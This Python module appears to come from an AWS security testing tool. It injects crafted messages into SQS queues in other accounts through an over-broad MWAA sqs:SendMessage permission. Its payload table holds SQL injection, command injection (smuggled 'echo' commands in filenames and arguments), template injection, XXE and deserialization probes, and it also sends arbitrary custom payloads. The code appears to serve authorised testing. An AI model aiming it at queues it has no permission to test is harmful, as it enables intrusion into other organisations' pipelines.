"""
Module 4: Cross-Account Event Injection Testing

Tests the ability to inject crafted messages into SQS queues in other
AWS accounts, simulating the cross-account attack chaining vector.

The MWAA execution role allows sqs:SendMessage to any queue matching
airflow-celery-* in any account, enabling injection of malicious events
into another organization's event-driven pipeline.

Injection payloads include:
  - Benign test markers
  - SQL injection probe payloads
  - Command injection probe payloads
  - Deserialization probe payloads
  - Custom user-defined payloads
"""

import json
import time
import uuid
from typing import Optional

from ..config import AttackerConfig, REQUIRED_QUEUE_PREFIX
from ..utils import (
    get_sqs_client,
    create_test_queue,
    set_queue_policy_allow_cross_account,
    delete_test_queue,
    send_message,
    receive_messages,
    print_section,
    print_success,
    print_fail,
    print_info,
    print_warn,
    print_result,
    logger,
)


# Pre-built injection test payloads (safe probing markers, not actual exploits)
INJECTION_PAYLOADS = {
    "benign": {
        "description": "Benign marker message to confirm delivery",
        "payload": {
            "type": "security_test",
            "marker": "MWAA_INJECTION_TEST",
            "test_id": None,  # filled at runtime
            "timestamp": None,
        },
    },
    "sqli_probe": {
        "description": "SQL injection probe (detection marker, not destructive)",
        "payload": {
            "event_type": "order_update",
            "order_id": "1' OR '1'='1' -- MWAA_SQLI_PROBE",
            "customer_name": "'; SELECT MWAA_SQLI_MARKER; --",
            "amount": "0 UNION SELECT MWAA_SQLI_MARKER",
            "test_id": None,
        },
    },
    "cmdi_probe": {
        "description": "Command injection probe (detection marker, not destructive)",
        "payload": {
            "event_type": "process_file",
            "filename": "test.txt; echo MWAA_CMDI_PROBE",
            "path": "$(echo MWAA_CMDI_PROBE)",
            "args": "`echo MWAA_CMDI_PROBE`",
            "test_id": None,
        },
    },
    "deserialization_probe": {
        "description": "Deserialization probe (detection marker, not destructive)",
        "payload": {
            "event_type": "process_data",
            "__class__": "MWAA_DESER_PROBE",
            "__reduce__": "MWAA_DESER_PROBE",
            "data": "rO0ABXNyABRNV0FBX0RFU0VSX1BST0JF",
            "test_id": None,
        },
    },
    "ssti_probe": {
        "description": "Server-side template injection probe",
        "payload": {
            "event_type": "render_template",
            "template_name": "{{7*7}}_MWAA_SSTI_PROBE",
            "user_input": "${7*7}_MWAA_SSTI_PROBE",
            "test_id": None,
        },
    },
    "xxe_probe": {
        "description": "XML External Entity probe",
        "payload": {
            "event_type": "process_xml",
            "xml_data": "<?xml version='1.0'?><!DOCTYPE foo [<!ENTITY xxe 'MWAA_XXE_PROBE'>]><root>&xxe;</root>",
            "test_id": None,
        },
    },
}


def list_payloads() -> None:
    """Display available injection test payloads."""
    print_section("Available Injection Test Payloads")
    for name, info in INJECTION_PAYLOADS.items():
        print_result(name, info["description"])
        print(f"      Payload: {json.dumps(info['payload'], indent=None)[:100]}...")
    print()


def inject_message(
    target_account_id: str,
    target_queue_name: str,
    target_region: str,
    payload_name: str = "benign",
    custom_payload: Optional[str] = None,
    source_profile: Optional[str] = None,
    source_region: Optional[str] = None,
) -> dict:
    """
    Inject a test message into a target queue in another account.

    Args:
        target_account_id: AWS account ID of the target
        target_queue_name: Name of the target queue (must start with airflow-celery-)
        target_region: AWS region of the target queue
        payload_name: Name of pre-built payload to use
        custom_payload: JSON string of custom payload (overrides payload_name)
        source_profile: AWS profile simulating the MWAA execution role
        source_region: AWS region for the source credentials
    """
    print_section("Cross-Account Event Injection")

    if not target_queue_name.startswith(REQUIRED_QUEUE_PREFIX):
        print_fail(f"Queue name must start with '{REQUIRED_QUEUE_PREFIX}'")
        return {"success": False, "error": "invalid_queue_name"}

    target_queue_url = (
        f"https://sqs.{target_region}.amazonaws.com/{target_account_id}/{target_queue_name}"
    )

    # Build payload
    test_id = str(uuid.uuid4())[:8]

    if custom_payload:
        try:
            payload = json.loads(custom_payload)
            print_info("Using custom payload")
        except json.JSONDecodeError:
            print_fail("Invalid JSON in custom payload")
            return {"success": False, "error": "invalid_json"}
    elif payload_name in INJECTION_PAYLOADS:
        payload = INJECTION_PAYLOADS[payload_name]["payload"].copy()
        payload["test_id"] = test_id
        if "timestamp" in payload:
            payload["timestamp"] = time.strftime("%Y-%m-%dT%H:%M:%SZ")
        print_info(f"Using payload: {payload_name} - {INJECTION_PAYLOADS[payload_name]['description']}")
    else:
        print_fail(f"Unknown payload: {payload_name}. Use 'list-payloads' to see options.")
        return {"success": False, "error": "unknown_payload"}

    print_info(f"Target: {target_queue_url}")
    print_info(f"Test ID: {test_id}")
    print_info(f"Payload: {json.dumps(payload, indent=2)}")

    sender_sqs = get_sqs_client(
        source_region or target_region,
        source_profile,
    )

    try:
        response = sender_sqs.send_message(
            QueueUrl=target_queue_url,
            MessageBody=json.dumps(payload),
            MessageAttributes={
                "Source": {
                    "DataType": "String",
                    "StringValue": "mwaa-security-tool",
                },
                "TestId": {
                    "DataType": "String",
                    "StringValue": test_id,
                },
            },
        )
        msg_id = response["MessageId"]
        print_success(f"FINDING: Message injected successfully! MessageId: {msg_id}")
        print_warn(f"Cross-account event injection to {target_account_id} succeeded.")
        print_warn("If the target processes these messages, injection attacks may be possible.")

        return {
            "success": True,
            "message_id": msg_id,
            "test_id": test_id,
            "target": target_queue_url,
            "payload_type": payload_name if not custom_payload else "custom",
        }

    except Exception as e:
        error_code = getattr(e, "response", {}).get("Error", {}).get("Code", "Unknown")
        print_fail(f"Injection failed: {error_code} - {e}")
        return {"success": False, "error": str(e)}


def inject_all_probes(
    target_account_id: str,
    target_queue_name: str,
    target_region: str,
    source_profile: Optional[str] = None,
    source_region: Optional[str] = None,
) -> dict:
    """Send all pre-built injection probe payloads to a target queue."""
    print_section("Full Injection Probe Suite")

    results = {}
    for name in INJECTION_PAYLOADS:
        print_info(f"\n--- Sending {name} probe ---")
        result = inject_message(
            target_account_id=target_account_id,
            target_queue_name=target_queue_name,
            target_region=target_region,
            payload_name=name,
            source_profile=source_profile,
            source_region=source_region,
        )
        results[name] = result

    # Summary
    print_section("Injection Probe Summary")
    succeeded = sum(1 for r in results.values() if r.get("success"))
    total = len(results)
    print_result("Total probes", f"{succeeded}/{total} delivered")
    for name, result in results.items():
        status = "DELIVERED" if result.get("success") else "FAILED"
        print_result(name, status)

    if succeeded > 0:
        print_warn(f"\n  {succeeded} probe(s) were successfully injected cross-account.")
        print_warn("  Review target-side logs for probe markers (MWAA_*_PROBE).")

    return results


def test_injection_safe(
    attacker: AttackerConfig,
    source_profile: Optional[str] = None,
    source_region: Optional[str] = None,
) -> bool:
    """
    Safe injection test using the attacker's own queue as the target.

    Verifies that cross-account SendMessage works, then reads back
    the injected message to confirm delivery.
    """
    print_section("Safe Injection Test (Self-Target)")
    queue_name = "airflow-celery-inject-test"

    sqs_attacker = get_sqs_client(attacker.region, attacker.profile)
    queue_url = create_test_queue(sqs_attacker, queue_name)
    attrs = sqs_attacker.get_queue_attributes(QueueUrl=queue_url, AttributeNames=["QueueArn"])
    set_queue_policy_allow_cross_account(sqs_attacker, queue_url, attrs["Attributes"]["QueueArn"])

    result = inject_message(
        target_account_id=attacker.account_id,
        target_queue_name=queue_name,
        target_region=attacker.region,
        payload_name="benign",
        source_profile=source_profile,
        source_region=source_region,
    )

    if result.get("success"):
        print_info("Verifying message delivery...")
        messages = receive_messages(sqs_attacker, queue_url, max_messages=1, wait_seconds=5)
        if messages:
            body = json.loads(messages[0]["Body"])
            print_success(f"Message verified: test_id={body.get('test_id')}")
        else:
            print_warn("Message sent but not yet available for verification.")

    # Cleanup
    delete_test_queue(sqs_attacker, queue_url)

    return result.get("success", False)
